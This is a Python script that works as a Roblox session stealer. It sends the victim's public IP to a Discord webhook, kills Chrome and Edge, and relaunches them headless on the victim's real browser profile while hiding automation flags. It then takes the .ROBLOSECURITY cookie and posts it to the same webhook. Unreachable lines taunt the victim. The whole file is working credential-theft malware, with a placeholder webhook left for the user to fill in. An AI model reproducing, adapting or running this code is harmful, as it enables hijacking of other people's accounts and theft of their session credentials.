import os
import psutil
import time
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.edge.service import Service as EdgeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.edge.options import Options as EdgeOptions
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager

print("Loading...")

# Webhook URL
WEBHOOK_URL = "your webhook here"

def send_to_webhook(title, message, color=16711680):
    """Send a message to Discord webhook."""
    embed = {
        "username": "Logger",
        "embeds": [
            {
                "title": title,
                "description": f"```{message}```",
                "color": color,  
                "footer": {"text": "Powered by Klemyard"}
            }
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json=embed)
    except requests.RequestException:
        pass  

def get_ip_address():
    """Fetch public IP address."""
    try:
        response = requests.get("https://api64.ipify.org?format=json")
        ip = response.json().get("ip", "Unknown IP")
        return ip
    except requests.RequestException:
        return "Unknown IP"

def send_ip():
    """Send public IP to webhook."""
    ip = get_ip_address()
    send_to_webhook("🌍 Public IP Logged", ip, color=3447003)

# Browser user data directories
USER_DATA_DIRS = {
    "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
    "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
}

def kill_browser(browser_name):
    """Force kill all browser processes before starting WebDriver."""
    process_names = {"Chrome": "chrome.exe", "Edge": "msedge.exe"}
    if browser_name in process_names:
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == process_names[browser_name]:
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
        time.sleep(2)  

def get_webdriver(browser_name):
    """Launch WebDriver with real user profile for extracting stored cookies."""
    try:
        kill_browser(browser_name)  

        if browser_name == "Chrome":
            options = ChromeOptions()
            options.add_argument(f"--user-data-dir={USER_DATA_DIRS['Chrome']}")
            options.add_argument("--headless")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
            options.add_argument("--log-level=3")
            options.add_argument("--silent")
            service = ChromeService(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return driver

        elif browser_name == "Edge":
            options = EdgeOptions()
            options.add_argument(f"--user-data-dir={USER_DATA_DIRS['Edge']}")
            options.add_argument("--headless")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
            options.add_argument("--log-level=3")
            options.add_argument("--silent")
            service = EdgeService(EdgeChromiumDriverManager().install())
            driver = webdriver.Edge(service=service, options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return driver

    except Exception as e:
        send_to_webhook("🚨 WebDriver Error", str(e))
        return None

def get_roblox_cookie():
    """Extract the Roblox .ROBLOSECURITY cookie from stored browser session."""
    for browser in USER_DATA_DIRS:
        if os.path.exists(USER_DATA_DIRS[browser]):  
            driver = get_webdriver(browser)
            if not driver:
                continue

            driver.get("https://www.roblox.com/")
            time.sleep(10)  
            cookies = driver.get_cookies()
            
            for cookie in cookies:
                if cookie["name"] == ".ROBLOSECURITY":
                    driver.quit()
                    send_to_webhook("✅ Roblox Cookie Found!", cookie['value'])
                    return cookie['value']
            
            driver.quit()
    
    send_to_webhook("⚠ No Roblox Cookie Found", "Could not retrieve .ROBLOSECURITY")
    return None

    print("this is what happens if you try to hack other people lol")
    time.sleep(2)  # Indented correctly
    print("uploading your IP cookies to the dark web")
    time.sleep(1)  # Indented correctly
    print("Enjoy having your cookies hacked and IP on the black market, dumbass")

if __name__ == "__main__":
    send_ip()  # Send IP before running main function
    get_roblox_cookie()
